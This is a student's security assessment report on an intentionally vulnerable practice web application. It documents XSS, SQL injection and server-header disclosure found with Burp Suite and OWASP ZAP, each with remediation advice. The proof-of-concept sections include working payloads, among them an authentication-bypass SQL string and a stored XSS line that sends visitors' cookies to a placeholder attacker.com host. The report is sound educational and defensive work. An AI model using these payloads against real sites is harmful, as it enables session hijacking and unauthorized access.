# Security Portfolio: Web Application Security Testing
### Burp Suite & OWASP ZAP Assessment

---

## 1. Engagement Overview

| Field | Details |
|---|---|
| **Target** | http://testphp.vulnweb.com |
| **Type of Test** | Web Application Security Testing |
| **Approach** | Black-box |
| **Tools Used** | Burp Suite Professional, OWASP ZAP, Firefox, Kali Linux |
| **Date** | 05 January 2026 |

**Scope:** Public-facing endpoints of testphp.vulnweb.com only.

---

## 2. Objectives

- Identify exploitable vulnerabilities across the web application
- Validate vulnerability exploitability through manual proof-of-concept testing
- Assess the business risk associated with each finding
- Provide actionable remediation guidance for all identified issues

---

## 3. Scope

**In-Scope:**
- http://testphp.vulnweb.com and all publicly accessible endpoints

**Out-of-Scope:**
- Any third-party infrastructure not belonging to testphp.vulnweb.com
- Denial-of-service testing
- Physical or social engineering attacks

**Authorization Statement:**
> This assessment was conducted against an intentionally vulnerable application (testphp.vulnweb.com) designed explicitly for security testing practice. All testing was authorized and performed for educational purposes only.

---

## 4. Methodology

### Phase 1 — Reconnaissance
Configured Firefox to proxy all traffic through `127.0.0.1:8080`. Both Burp Suite Professional and OWASP ZAP were used to intercept and capture HTTP requests and responses from the target application. Initial header analysis revealed server technology details including nginx/1.19.0 and PHP/5.6.40.

### Phase 2 — Mapping / Spidering
Burp Suite's integrated crawler was used to map the application, discovering approximately **42 URLs**. OWASP ZAP's Spider and Ajax Spider were subsequently run, discovering **91 URLs** — including non-linked paths such as `/secured/`, `/hpp/`, `/Flash/`, and `/crossdomain.xml`.

### Phase 3 — Vulnerability Identification
Both tools were used to run active scans against the mapped attack surface. Burp Suite flagged XSS and SQL Injection across multiple parameters. OWASP ZAP confirmed the same findings and additionally flagged missing security headers, absence of Anti-CSRF tokens, and information leakage via server headers.

### Phase 4 — Exploitation
Manual testing was performed to validate scanner findings. XSS payloads were injected directly into the `/search.php` input field. SQL injection was confirmed at `/secured/` via the `uuname` parameter. Fuzzing was conducted via OWASP ZAP's Fuzzer using built-in XSS payload lists, and also via direct browser injection.

### Phase 5 — Validation
All findings were manually confirmed with working payloads and observed application responses to distinguish true positives from false positives.

### Phase 6 — Documentation
All evidence including request/response captures, payloads, and tool output was recorded throughout the engagement.

---

## 5. Vulnerability Summary Table

| ID | Vulnerability | Severity | Affected Endpoint |
|---|---|---|---|
| 01 | Reflected Cross-Site Scripting (XSS) | High | /search.php, /artists.php, /listproducts.php |
| 02 | Stored Cross-Site Scripting (XSS) | High | /guestbook.php |
| 03 | SQL Injection | High | /secured/, /product.php, /artists.php |
| 04 | Information Disclosure (Server Headers) | Medium | HTTP Response Headers |
| 05 | Missing Anti-CSRF Tokens | Medium | /guestbook.php, /comment.php |
| 06 | Missing Security Headers (CSP, X-Frame-Options) | Medium | Global / All Pages |

---

## 6. Detailed Findings

---

### Finding 01 — Reflected Cross-Site Scripting (XSS)

**Severity:** High

**Affected Endpoints:**
`/search.php`, `/artists.php`, `/listproducts.php`, `/product.php`, `/secured/newuser.php`

**Description:**
The application reflects unsanitized user input directly into HTML responses without output encoding. Any JavaScript injected into a vulnerable parameter is executed in the victim's browser as trusted page content. This exists because the application performs no server-side input validation or output encoding on user-controlled values before rendering them in the DOM.

**Proof of Concept:**

Request intercepted via Burp Suite showing HTTP headers for the target application:

![Burp Suite Request/Response Headers](image.jpg)

Payload injected into the search field:
```
<script>alert('hacked')</script>
```

The application echoed the payload directly into the HTML response, triggering JavaScript execution in the browser:

![XSS Alert Popup - hacked](image.jpg)

OWASP ZAP fuzzer confirming multiple XSS payload responses across `/search.php`:

![OWASP ZAP Fuzzer Results](image.jpg)

**Impact:**
A successful XSS attack allows an attacker to execute arbitrary JavaScript in a victim's browser session. Practical outcomes include session cookie theft leading to account takeover, redirection to phishing pages, and keylogging of credentials entered on the page.

**Remediation:**
- Apply output encoding on all dynamic content before rendering — use PHP's `htmlspecialchars()` to convert `<` to `&lt;` and `>` to `&gt;`
- Implement a strict Content Security Policy header: `Content-Security-Policy: default-src 'self'; script-src 'self'`
- Validate all user inputs server-side using a whitelist of permitted characters
- Adopt a modern framework or library (e.g., OWASP ESAPI) with built-in XSS protection

---

### Finding 02 — Stored Cross-Site Scripting (XSS)

**Severity:** High

**Affected Endpoint:** `/guestbook.php`

**Description:**
The guestbook functionality stores user-submitted input in the database and renders it back to all subsequent visitors without sanitization. Unlike reflected XSS, stored XSS does not require a victim to click a crafted link — the malicious payload fires automatically for every user who loads the affected page.

**Proof of Concept:**

OWASP ZAP site map showing `/guestbook.php` flagged as a high-severity target:

![OWASP ZAP Site Map - guestbook.php](image.jpg)

Payload submitted via the guestbook form:
```
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

Upon revisiting the page, the payload executes in any visitor's browser, exfiltrating session cookies to the attacker's server.

**Impact:**
Every user who visits the guestbook page after payload submission is affected. This enables mass session hijacking, persistent phishing overlays, and credential theft at scale — without any victim interaction beyond normal browsing.

**Remediation:**
- Sanitize and encode all stored user input before database insertion and before rendering
- Implement Anti-CSRF tokens on all form submissions to prevent unauthorized submissions
- Apply a Content Security Policy to block inline script execution

---

### Finding 03 — SQL Injection

**Severity:** High

**Affected Endpoints:** `/secured/`, `/artists.php`, `/product.php`, `/listproducts.php`, `/guestbook.php`

**Description:**
User-supplied input is concatenated directly into SQL queries without parameterization or sanitization. An attacker can manipulate query logic to bypass authentication, extract database contents, or modify data. The database backend was identified as MySQL.

**Proof of Concept:**

OWASP ZAP confirming SQL Injection at `/secured/` via the `uuname` parameter with High severity and Certain confidence:

![OWASP ZAP SQL Injection Finding - /secured/](image.jpg)

Example injection payload:
```
' OR '1'='1
```

Injected into the `uuname` parameter, this manipulates the WHERE clause to return all rows, effectively bypassing authentication.

**Impact:**
SQL Injection at an authentication endpoint allows complete authentication bypass, granting unauthorized administrative access. Combined with further enumeration, an attacker can dump the entire database including user credentials, personal data, and application secrets.

**Remediation:**
- Replace all raw query construction with prepared parameterized statements:
```php
$stmt = $pdo->prepare("SELECT * FROM artists WHERE id = ?");
$stmt->execute([$id]);
```
- Use stored procedures to encapsulate database logic
- Enforce numeric validation on ID parameters: `if (!is_numeric($id)) { die(); }`
- Apply least-privilege database accounts — application user should have no DROP or CREATE rights
- Suppress verbose database errors in production; log them server-side only
- Deploy a Web Application Firewall (e.g., ModSecurity) to filter common injection patterns

---

### Finding 04 — Information Disclosure via HTTP Response Headers

**Severity:** Medium

**Affected Endpoint:** All HTTP Responses (Global)

**Description:**
The server returns detailed technology stack information in HTTP response headers on every request. This allows an attacker to fingerprint the exact software versions in use and target known CVEs without any guesswork.

**Proof of Concept:**

Response headers captured in both Burp Suite and OWASP ZAP:

![Burp Suite Response Headers showing nginx and PHP version](image.jpg)

![OWASP ZAP Response Headers](image.jpg)

Headers observed:
```
Server: nginx/1.19.0
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
```

Both `nginx/1.19.0` and `PHP/5.6.40` are outdated versions with publicly known vulnerabilities.

**Impact:**
An attacker can immediately query public CVE databases for exploits targeting nginx/1.19.0 and PHP/5.6.40, dramatically reducing the time needed to achieve remote code execution or other critical exploits. PHP 5.6 reached end-of-life in December 2018 and receives no security patches.

**Remediation:**
- Remove or genericize the `Server` header in nginx configuration: `server_tokens off;`
- Remove the `X-Powered-By` header in PHP configuration: `expose_php = Off`
- Upgrade PHP to a currently supported version (8.x)
- Upgrade nginx to a currently supported stable release

---

## 7. Attack Chain

```
Information Disclosure (nginx/1.19.0 + PHP/5.6.40 exposed)
        ↓
Version-specific CVE identification
        ↓
SQL Injection at /secured/ → Authentication Bypass
        ↓
Stored XSS at /guestbook.php → Mass Session Hijacking
        ↓
Session Cookie Theft → Full Account Takeover
```

The disclosed server version confirms an outdated PHP installation, lowering attacker effort. SQL injection at the login endpoint bypasses authentication entirely. From an authenticated session, stored XSS can be planted to harvest cookies from all subsequent visitors, chaining into widespread account compromise.

---

## 8. Tools Used

- Burp Suite Professional v2025.1+
- OWASP ZAP (latest)
- Firefox (proxy client)
- Kali Linux

---

## 9. Challenges Encountered

- **ZAP Fuzzer rendering:** Fuzzed XSS payloads could not be rendered directly in the ZAP response tab due to interface limitations, requiring manual browser-based validation to confirm exploitation.
- **Scanner noise:** Both tools generated alerts for informational issues (e.g., banner leakage) alongside high-severity findings, requiring manual triage to prioritize true positives.
- **Burp crawler depth:** Burp Suite's free-tier crawler discovered fewer URLs (41) than OWASP ZAP's Spider + Ajax Spider combination (91), requiring ZAP to supplement coverage.

---

## 10. Key Takeaways

- **Tool pairing matters:** Using both Burp Suite and OWASP ZAP in parallel provided broader coverage than either tool alone. ZAP's Ajax Spider discovered JavaScript-rendered URLs that standard crawling missed.
- **Manual validation is non-negotiable:** Scanner output requires manual confirmation. Direct browser injection of XSS payloads proved faster and more reliable than relying on ZAP's fuzzer render output alone.
- **Header analysis yields high-value intelligence early:** Simply inspecting HTTP response headers revealed outdated, end-of-life software versions — a recon step that takes under a minute but significantly shapes the rest of an assessment.
- **Output encoding gaps are pervasive:** XSS appeared across six different endpoints, indicating a systemic absence of encoding practices rather than isolated mistakes — a pattern that points to a framework-level remediation need, not per-parameter fixes.

---

## 11. Disclaimer

> This assessment was conducted exclusively against **http://testphp.vulnweb.com**, an intentionally vulnerable web application provided by Acunetix for security education and testing purposes. All activities were performed in a controlled environment for **educational purposes only**. No unauthorized systems were accessed. All techniques demonstrated in this report must only be applied against systems for which explicit written authorization has been obtained.

---

*Report prepared by: Asekun Fatai | Student ID: 2025/INT/12158 | Course: Kali Linux Tools and System Security | Instructor: Mr. Aminu Idris*